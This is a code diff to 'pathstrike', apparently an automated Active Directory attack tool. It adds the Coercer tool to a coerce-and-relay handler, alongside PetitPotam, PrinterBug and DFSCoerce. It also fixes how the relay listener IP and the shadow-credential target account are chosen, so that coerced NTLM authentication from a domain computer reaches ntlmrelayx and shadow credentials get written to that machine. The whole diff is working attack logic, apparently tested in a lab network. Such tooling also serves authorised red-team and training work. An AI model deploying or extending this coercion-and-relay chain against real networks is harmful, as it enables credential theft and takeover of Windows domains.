@@ -29,6 +29,7 @@ from pathstrike.models import (
     RollbackAction,
 )
 from pathstrike.tools.coercion_wrapper import (
+    run_coercer,
     run_dfscoerce,
     run_petitpotam,
     run_printerbug,
@@ -67,6 +68,7 @@ class CoerceAndRelayHandler(BaseEdgeHandler):
             )
 
         coercion_tools = {
+            "coercer": "Coercer (multi-method)",
             "PetitPotam.py": "PetitPotam (MS-EFSRPC)",
             "printerbug.py": "PrinterBug (MS-RPRN)",
             "DFSCoerce.py": "DFSCoerce (MS-DFSNM)",
@@ -76,7 +78,7 @@ class CoerceAndRelayHandler(BaseEdgeHandler):
             return (
                 False,
                 "No coercion tools found on PATH. Install at least one of: "
-                "PetitPotam.py, printerbug.py, DFSCoerce.py",
+                "coercer, PetitPotam.py, printerbug.py, DFSCoerce.py",
             )
 
         return (
@@ -141,10 +143,13 @@ class CoerceAndRelayHandler(BaseEdgeHandler):
         use_shadow = not is_smb_relay
         use_delegate = False
 
+        # Shadow-credential target must be a sAMAccountName (SHORT$), not the
+        # FQDN BloodHound names computers by (WINTERFELL.NORTH...$ is invalid).
+        shadow_sam = f"{source_host.split('.')[0]}$" if use_shadow else None
         session = await relay.start_relay(
             target_url=relay_url,
             shadow_credentials=use_shadow,
-            shadow_target=f"{source_host}$" if use_shadow else None,
+            shadow_target=shadow_sam,
             delegate_access=use_delegate,
         )
 
@@ -158,7 +163,11 @@ class CoerceAndRelayHandler(BaseEdgeHandler):
 
         try:
             # --- Step 2: Trigger coercion -----------------------------------
-            listener_ip = dc_ip  # ntlmrelayx listens on our machine
+            # The coerced host must authenticate back to OUR relay listener,
+            # so the listener IP is THIS machine's address on the route to the
+            # DC — never the DC's own IP (that would point the target at
+            # itself and no auth would ever reach ntlmrelayx).
+            listener_ip = self._local_ip_toward(dc_ip)
             coerce_result = await self._try_coercion(
                 source_host=source_host,
                 listener_ip=listener_ip,
@@ -225,6 +234,24 @@ class CoerceAndRelayHandler(BaseEdgeHandler):
     # Internal helpers
     # ------------------------------------------------------------------
 
+    @staticmethod
+    def _local_ip_toward(dc_ip: str) -> str:
+        """Return this host's source IP on the route to *dc_ip*.
+
+        Opens a UDP socket toward the DC (no packets are sent) and reads the
+        kernel-selected source address — i.e. the interface the coerced auth
+        will actually arrive on (here, our 192.168.56.0/24 address).  Falls
+        back to 127.0.0.1 only if resolution fails.
+        """
+        import socket
+
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+                s.connect((dc_ip, 9))  # discard port; connect() just picks a route
+                return s.getsockname()[0]
+        except OSError:
+            return "127.0.0.1"
+
     async def _try_coercion(
         self,
         source_host: str,
@@ -239,6 +266,23 @@ class CoerceAndRelayHandler(BaseEdgeHandler):
         Returns a result dict with ``success``, ``method``, and ``error`` keys.
         """
         attempts: list[tuple[str, dict]] = []
+
+        # Coercer first when present — one binary covers every method and is
+        # the only coercion tool reliably on PATH in many distros.
+        if shutil.which("coercer"):
+            self.logger.info("Trying Coercer: %s → %s", source_host, listener_ip)
+            result = await run_coercer(
+                listener_ip=listener_ip,
+                target_ip=source_host,
+                dc_ip=self._get_dc_host(),
+                domain=domain,
+                username=username,
+                password=password,
+                nt_hash=nt_hash,
+            )
+            attempts.append(("Coercer", result))
+            if result["success"]:
+                return {"success": True, "method": "Coercer", "output": result["output"]}
 
         if shutil.which("PetitPotam.py"):
             self.logger.info("Trying PetitPotam: %s → %s", source_host, listener_ip)
